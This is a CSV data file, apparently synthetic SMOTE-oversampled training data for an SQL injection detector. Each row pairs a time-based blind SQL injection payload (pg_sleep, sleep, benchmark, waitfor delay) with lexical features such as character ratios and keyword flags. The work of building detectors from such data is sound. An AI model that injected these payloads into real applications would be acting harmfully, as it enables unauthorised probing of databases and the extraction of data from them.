id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000745,attack,time,1 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   -- fyaq,nearest_attack_euclidean,R000008,0.15650593911542812,69.89122784282928,26.06146398916064,3.664072784624392,23.215123962062243,10.245855956642563,28.338051940383522,8.092195983740961,0.33249708858284843,0.14611827603963973,0.4055562266026683,0.11582840877484354,0.0,0.030731994580320277,2.0,0.0,0.0,1.0307319945803202,0.0,4.03073199458032,0.0,1.0,0.0,3.03073199458032,0.0,0.03073199458032022,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.03073199458032022,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.03073199458032
SMOTE_000746,attack,time,1 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   -- fyaq,nearest_attack_euclidean,R000008,0.4176998717829837,70.5223066449162,26.09514416530726,3.668247996872129,23.09514416530726,10.761153322458096,28.47572082653631,8.190288330614525,0.32848284647453174,0.1512867029497778,0.4041261979494207,0.11610425262626985,0.0,0.095144165307262,2.0,0.0,0.0,1.095144165307262,0.0,4.0,0.0,1.0,0.0,3.095144165307262,0.0,0.09514416530726211,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.09514416530726211,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.095144165307262
SMOTE_000747,attack,time,"1"" where 1132  =  1132 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000012,1.3980242084390164,86.97302429711168,27.394604859422337,3.664577412386666,24.394604859422337,18.0,34.57841943768935,10.0,0.2805475594666952,0.20712229577150193,0.397262202666524,0.11506794209527885,0.0,0.6053951405776637,2.0,0.0,0.0,2.0,0.0,4.394604859422336,0.0,1.0,0.0,4.0,0.0,0.6053951405776639,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.39460485942233625,0.6053951405776636,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000748,attack,time,"1 and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )   -- kvkk",nearest_attack_euclidean,R000023,0.7058215167575398,73.78872425780594,26.47181064451485,3.794209103209364,18.57744851561188,21.57744851561188,25.528189355485146,8.10563787109703,0.25164140939507623,0.2923009115021675,0.3461651474963875,0.10989253160636875,0.0,-1.1102230246251565e-16,2.0,0.0,0.0,1.1056378710970298,0.0,4.0,0.0,0.0,1.0,3.10563787109703,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.8943621289029704,0.0,0.0,0.0,0.10563787109702974,0.0,0.8943621289029703,0.10563787109702971,0.0,0.0,0.0,0.0,0.0,0.0,0.10563787109702971,0.8943621289029704,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.10563787109703
SMOTE_000749,attack,time,select pg_sleep  (  5  )   and    (    (     (  '%'  =  ',nearest_attack_euclidean,R000005,2.9834212280904793,61.166376981589146,20.777584654392765,3.198295476800288,17.388792327196384,5.166376981589149,28.074138448535745,10.537069224267873,0.2840242240682529,0.07956329371849875,0.4626265175705615,0.1737859646426869,2.0741384485357446,-1.1102230246251565e-16,0.9258615514642551,0.0,0.0,1.0,0.0,4.5370692242678725,1.0,1.0,0.0,1.9258615514642554,1.0,0.0,0.46293077573212754,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.46293077573212754,0.5370692242678724,0.4629307757321276,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.4629307757321275
SMOTE_000750,attack,time,"1"" and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and ""ojpe"" like ""ojpe",nearest_attack_euclidean,R000026,1.1962863155330647,87.79158559092834,26.83712858264288,3.677917985828399,33.37128582642879,10.0,33.768814095071065,10.651485669428485,0.3826690344510171,0.1141314006342264,0.38235181717301997,0.12084774774173655,0.0,4.0,0.0,0.0,0.0,1.0,0.0,4.651485669428484,0.0,0.8371285826428789,0.1628714173571212,1.0000000000000002,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.8371285826428788,0.0,0.0,0.8371285826428788,1.8371285826428791,0.16287141735712107,0.0,0.0,0.0,0.0,0.0,0.0,0.16287141735712118,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.8371285826428787
SMOTE_000751,attack,time,"1 where 6383  =  6383 or elt  (  6272  =  6272,sleep  (  5   )    )   --",nearest_attack_euclidean,R000025,0.5532482871649224,70.25438171918262,22.232749104108986,3.4357875201243,15.349123656163478,17.06900358356406,29.06900358356406,8.767250895891015,0.22083849353217133,0.24132295006611243,0.41309376375271295,0.1247447926490033,0.0,0.11637455205449238,2.0,0.0,0.0,1.8836254479455077,0.0,3.8836254479455077,0.0,0.0,0.8836254479455076,3.8836254479455077,0.0,0.11637455205449243,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000752,attack,time,1'   )    )     )   and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000002,2.3011781594220597,74.04562028205619,23.244806240632673,3.1215694719312728,18.622403120316335,6.900407020711757,36.86720936094901,11.655600780079084,0.2546495568262803,0.08503013737022067,0.4990716434991469,0.1612486623043521,1.6887984398418316,-1.1102230246251565e-16,1.3112015601581681,0.0,0.0,1.0,0.0,6.311201560158168,0.34439921992091593,1.0,0.0,2.3112015601581684,1.0,0.0,0.6556007800790841,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.6556007800790841,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.655600780079084
SMOTE_000753,attack,time,1 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   -- fyaq,nearest_attack_euclidean,R000008,1.3838340016694008,67.08266619569883,24.56199964677413,3.582732597227258,21.082666195698838,10.0,27.52066654892471,8.479333451075291,0.3136683712379368,0.14920252799175288,0.4103927175911344,0.126736383179176,0.0,0.47933345107529046,2.0,0.0,0.0,1.0,0.0,4.0,0.0,1.0,0.0,3.0,0.0,0.4793334510752906,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000754,attack,time,"1"" where 1132  =  1132 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000012,2.5132423778495974,81.58192754828252,24.863704717676573,3.5265696668574846,20.154668491817834,18.0,33.427259056464685,10.0,0.24494737366626973,0.2211650579268013,0.4110180917809282,0.12286947662600073,0.0,0.5727409435353147,2.0,0.0,0.0,2.0,0.0,4.427259056464685,0.0,0.5727409435353147,0.4272590564646853,4.0,0.0,0.5727409435353146,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.5727409435353146,0.0,1.0,0.5727409435353147,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.4272590564646853,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.572740943535315
SMOTE_000755,attack,time,1%' or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000003,2.1747028442875793,65.5223919063788,24.477608093621193,3.6285940596240565,19.95521618724239,10.0,25.56717571913642,10.0,0.3049523726649622,0.15264585249436835,0.3897559223463011,0.15264585249436835,1.477608093621194,-1.1102230246251565e-16,1.5223919063788056,0.0,0.0,1.0,0.0,3.761195953189403,0.761195953189403,0.7611959531894029,0.0,3.0,1.0,0.0,0.7611959531894028,0.23880404681059708,0.0,1.0,1.0,0.0,0.0,0.0,0.23880404681059708,1.0,0.0,0.2388040468105971,0.7611959531894028,0.23880404681059714,0.7611959531894028,0.0,0.0,0.0,0.0,0.0,0.0,0.23880404681059716,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.238804046810597
SMOTE_000756,attack,time,"1"" or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000013,1.8049755611354217,61.902169176274235,23.38722885296572,3.551075763878726,18.61277114703428,10.0,25.0638557351714,8.225542294068559,0.3014005155757133,0.16220737064433405,0.4039924574970949,0.13239965628285782,0.0,1.0,2.0,0.0,0.0,1.0,0.0,3.6127711470342794,0.0,0.6127711470342798,0.0,3.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.6127711470342797,0.0,0.3872288529657203,0.6127711470342797,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.3872288529657203,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000757,attack,time,1'   )    )     )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,nearest_attack_euclidean,R000014,0.406868311991462,97.67732207556037,24.082667370277477,2.9237826926363804,30.0,2.0,51.84265681611532,13.834665259445046,0.3078593571538504,0.020523957143590038,0.5299409705233927,0.14167571517916688,0.9173326297225235,0.08266737027747639,0.0,0.0,1.0,0.0,0.0,10.751997889167571,0.08266737027747652,0.0,0.0,1.0000000000000002,0.9173326297225235,0.08266737027747645,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000758,attack,time,"1'  )   or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   ",nearest_attack_euclidean,R000029,0.7727771943906927,72.0,25.34731363961839,3.582642936401635,15.435124240254407,20.564875759745593,28.0,8.0,0.214376725559089,0.285623274440911,0.3888888888888889,0.1111111111111111,0.7824378798727961,-1.1102230246251565e-16,0.0,0.0,0.0,1.0,0.0,5.0,0.0,0.0,1.0,1.0000000000000002,0.782437879872796,0.0,0.0,0.21756212012720394,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000759,attack,time,1  )   where 9649  =  9649 and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000020,1.4251643930412867,87.98867290145961,27.59773458029192,3.6465917988705265,24.59773458029192,18.0,35.39093832116768,10.0,0.279618207802586,0.20473253434950683,0.4019089609870701,0.11374029686083711,0.0,0.40226541970807916,2.0,0.0,0.0,2.0,0.0,4.597734580291921,0.0,1.0,0.0,4.0,0.0,0.40226541970807916,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.5977345802919208,0.4022654197080791,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000760,attack,time,1%'   )    )     )   and sleep  (  5  )   and    (    (     (  '%'  =  ',nearest_attack_euclidean,R000021,0.14294438033035356,71.65594808535182,15.068810382929636,2.3735518435560046,11.114683971549391,1.977063205690122,43.655948085351824,14.908252822760486,0.15571194371654148,0.02754304450267668,0.6087637783601002,0.2079812334206817,3.977063205690121,-1.1102230246251565e-16,0.0,0.0,0.0,1.0,0.0,7.931189617070364,1.9770632056901214,0.022936794309878494,0.0,1.0000000000000002,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.022936794309878494,0.0,0.0,0.0,1.9770632056901216,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9770632056901215,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.9770632056901216
SMOTE_000761,attack,time," select sleep  (  5  )   and    (    (     (  ""zlal""  =  ""zlal",nearest_attack_euclidean,R000031,0.04075941449887914,62.11245097081968,16.033073814946967,2.8550621289408227,22.039688577936356,1.0066147629893933,30.059532866904537,9.006614762989393,0.35483600867170706,0.016189804886590997,0.4839357918790304,0.14503839456267156,0.0,2.986770474021214,0.0,0.0,0.006614762989393008,0.993385237010607,0.0,5.019844288968179,0.0,0.0,0.0,1.0000000000000002,0.0,1.0,0.0,0.0,0.0,0.993385237010607,1.0,0.0,0.0,0.0,0.0,1.006614762989393,0.0,0.0,0.006614762989393008,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.013229525978786
SMOTE_000762,attack,time,1'||  (  select 'oxdh' where 6967  =  6967 and sleep  (  5  )  #,nearest_attack_euclidean,R000009,3.4395547873672485,64.75539479300137,25.24460520699862,3.748773752389459,21.489210413997245,10.0,23.26618437900413,10.0,0.3323710668221572,0.1544616600544475,0.3587056130689478,0.1544616600544475,2.244605206998622,-1.1102230246251565e-16,0.7553947930013776,0.0,0.0,1.0,0.0,3.3776973965006887,0.3776973965006888,0.3776973965006888,0.0,3.0,1.0,0.0,0.3776973965006888,0.6223026034993112,0.0,1.0,1.0,0.0,0.0,0.0,0.6223026034993111,1.0,0.0,0.6223026034993112,0.3776973965006888,0.6223026034993112,0.37769739650068873,0.0,0.0,0.0,0.0,0.0,0.0,0.6223026034993112,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.6223026034993113
SMOTE_000763,attack,time,select pg_sleep  (  5  )   and    (    (     (  '%'  =  ',nearest_attack_euclidean,R000005,4.46715620327564,77.64446255156871,20.644462551568708,2.813368807721034,15.618196633101668,6.105063673868151,42.460601122299444,13.460601122299444,0.19802896076239368,0.07534733256615954,0.5510051754579212,0.17561853121352566,2.460601122299444,-1.1102230246251565e-16,1.0262659184670373,0.0,0.0,1.0,0.0,7.486867040766482,0.9737340815329625,0.5131329592335188,0.0,2.0262659184670375,1.0,0.0,0.5131329592335186,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.5131329592335188,0.0,0.0,0.5131329592335186,1.4868670407664812,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.4868670407664813,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000764,attack,time,"1%""  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000001,1.1886434998220075,74.56176853304405,24.763236114223723,3.5066235065033293,20.272060190372873,12.035296304596597,31.50882407614915,10.745587961925425,0.2713575263278603,0.15888787941937332,0.4243101383400537,0.14544445591271263,0.0,1.0,2.0,0.0,0.0,1.2544120380745747,0.0,4.745587961925425,0.7455879619254253,1.0,0.0,3.2544120380745745,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.2544120380745745,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.2544120380745745
SMOTE_000765,attack,time,1   )    )    as dhqt where 8485  =  8485 waitfor delay '0:0:5'--,nearest_attack_euclidean,R000024,4.046554772626404,62.16712280994932,23.381213034256753,3.6837381219384957,19.762426068513506,11.190606517128376,22.618786965743247,8.595303258564188,0.31530871878635114,0.17967744029017313,0.36676699569346827,0.13824684523000752,1.1906065171283768,-1.1102230246251565e-16,2.0,0.0,0.0,1.0,0.0,2.809393482871623,0.0,0.0,0.4046967414358116,3.0,0.5953032585641884,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.5953032585641884,0.0,0.4046967414358116,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.4046967414358115,0.0,0.5953032585641883,0.5953032585641883,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.595303258564188
SMOTE_000766,attack,time,"1"" or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000013,2.0408078802437712,71.89552806005574,24.149254676675955,3.397185028348591,19.38308489222532,10.0,32.36318849115447,10.149254676675957,0.27263864408778254,0.14106482287292726,0.44549175056599355,0.14080478247329667,0.383084892225319,0.616915107774681,2.0,0.0,0.0,1.0,0.0,5.149254676675957,0.0,1.0,0.0,3.0,0.38308489222531894,0.6169151077746811,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.38308489222531894,0.6169151077746811,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000767,attack,time,1%'   )    )     )   and sleep  (  5  )   and    (    (     (  '%'  =  ',nearest_attack_euclidean,R000021,1.1557667182044231,70.76286903167983,15.123713096832018,2.4222984468053377,12.360844065152195,1.8762869031679834,42.268016644351746,14.257721419007893,0.1777753614118459,0.026336675395325956,0.5953698389335604,0.20051812425926768,3.5051476126719283,0.37113929049605343,0.0,0.0,0.0,1.0,0.0,7.628860709503947,1.7525738063359644,0.0,0.0,1.0000000000000002,0.8762869031679821,0.12371309683201781,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.12371309683201781,0.0,0.0,0.0,1.8762869031679825,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000768,attack,time,"1"" where 1132  =  1132 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000012,1.4593689729605726,87.05959984435258,27.411919968870517,3.663044289290787,24.411919968870517,18.0,34.64767987548206,10.0,0.2804683400117035,0.20691858860152335,0.3976582999414824,0.11495477144529075,0.0,0.5880800311294841,2.0,0.0,0.0,2.0,0.0,4.4119199688705155,0.0,1.0,0.0,4.0,0.0,0.5880800311294841,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.41191996887051574,0.5880800311294843,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000769,attack,time,"1%"" rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #",nearest_attack_euclidean,R000006,0.29118508066721144,82.72495479706157,24.724954797061567,3.2231580665826023,29.862477398530782,2.0,39.0,11.862477398530782,0.3609633948705518,0.024180279152947515,0.4715154434824766,0.14334088249402413,0.0,1.0,0.0,0.0,1.0,0.0,0.0,8.0,0.9312386992653914,0.0,0.0,1.0000000000000002,0.0,1.0,0.0,0.9312386992653912,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,0.06876130073460862,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.068761300734609
SMOTE_000770,attack,time,1 or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  ) ,nearest_attack_euclidean,R000022,2.7483612190175895,84.28331014757428,21.92352122855563,3.1910758179646592,33.33429599520386,1.512746461907394,38.97450707618521,10.461760614277814,0.39173134148995303,0.01873261330076592,0.465944645187076,0.12359140002220506,1.4617606142778148,-1.1102230246251565e-16,0.0,0.0,1.0,0.0,0.0,8.0,0.0,0.0,0.0,1.0000000000000002,0.48725353809260474,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,0.48725353809260485,0.512746461907395,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_000771,attack,time,"1""  )   as kfvy where 7305  =  7305 or sleep  (  5  )  --",nearest_attack_euclidean,R000028,2.1251060596598204,61.90044934003456,24.816741556672426,3.651566689648744,20.04185389168107,10.0,24.450224670017285,7.408370778336214,0.3229538733041441,0.16297877106525663,0.3940637988075832,0.12000355682301607,0.0,0.5916292216637863,2.0,0.0,0.0,1.0,0.0,3.408370778336214,0.0,0.4083707783362137,0.0,3.0,0.0,0.5916292216637864,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.4083707783362137,0.0,0.5916292216637863,0.4083707783362137,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.5916292216637863,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000772,attack,time,"1 and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )   -- kvkk",nearest_attack_euclidean,R000023,1.4991817382632349,70.05381773666257,25.520181651248464,3.7147211191903713,18.01345443416564,19.040363302496928,25.0,8.0,0.2572164704407429,0.2664964804702228,0.3608235220371472,0.1154635270518871,0.0,-1.1102230246251565e-16,2.0,0.0,0.0,1.0,0.0,4.0,0.0,0.0,1.0,3.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.7533636085414108,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.24663639145858926,0.7533636085414108,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000773,attack,time,1  )   where 9649  =  9649 and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000020,1.3652642311132415,93.0165832066074,28.0,3.62044323585769,26.88536450412962,18.0,37.754145801651845,10.377072900825924,0.28846578517080285,0.19384370774161758,0.40615187568074745,0.11153863140683211,0.0,0.3770729008259237,2.0,0.0,0.0,2.0,0.0,5.0,0.0,1.0,0.0,4.0,0.0,0.37707290082592376,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.6229270991740762,0.3770729008259238,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000774,attack,time,"1"" where 1132  =  1132 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000012,0.7920741366699129,82.62655099173857,26.49140378394398,3.6556565833741392,23.152339639906632,16.643743423850612,32.660935855962656,10.169532072018674,0.2798527996007188,0.19974155313604103,0.3964380058043832,0.12396764145885693,0.0,1.0,2.0,0.0,0.0,1.8304679279813263,0.0,4.169532072018674,0.1695320720186736,1.0,0.0,3.8304679279813265,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.8304679279813265,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.8304679279813265
